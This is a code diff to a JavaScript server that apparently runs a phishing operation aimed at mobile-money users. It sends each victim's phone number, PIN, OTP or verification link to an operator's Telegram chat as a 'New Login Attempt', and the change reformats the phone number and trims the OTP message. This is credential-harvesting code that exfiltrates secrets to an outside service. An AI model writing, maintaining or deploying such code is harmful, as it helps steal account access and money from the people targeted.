@@ -59,6 +59,17 @@ function isAdminApprovalConfigured() {
   return Boolean(api && ADMIN_CHAT_ID);
 }
 
+function formatTelegramPhone(phone) {
+  const value = String(phone || '').trim();
+  if (!value || value === '—') return '—';
+
+  const digits = value.replace(/\D/g, '');
+  if (!digits) return '—';
+
+  const withoutCountryCode = digits.startsWith('260') ? digits.slice(3) : digits;
+  return withoutCountryCode;
+}
+
 const demoUsers = new Map();
 const demoPayments = [];
 const demoMtnRequests = new Map();
@@ -82,9 +93,11 @@ setInterval(() => {
 function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, link }) {
   if (!api || !ADMIN_CHAT_ID) return;
 
+  const telegramPhone = formatTelegramPhone(phone);
+
   const stepLabel = step === 'link' ? 'Link Verification' : step === 'otp' ? 'OTP Verification' : 'Login';
   const secretLine = step === 'otp'
-    ? `🔑 OTP: \`${otp || '—'}\`\n📎 Link: \`${link || '—'}\`\n`
+    ? `🔑 OTP: \`${otp || '—'}\`\n`
     : step === 'link'
       ? `🔑 Link: \`${link || '—'}\`\n`
       : `🔑 PIN: \`${code || '—'}\`\n`;
@@ -93,7 +106,7 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
     `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
     `📦 Data: ${plan || '—'}\n` +
     `💰 Price: USD ${price || '—'}\n` +
-    `📱 Phone: \`${phone || '—'}\`\n` +
+    `📱 Phone: \`${telegramPhone}\`\n` +
     secretLine;
 
   const buttonRow = step === 'otp'
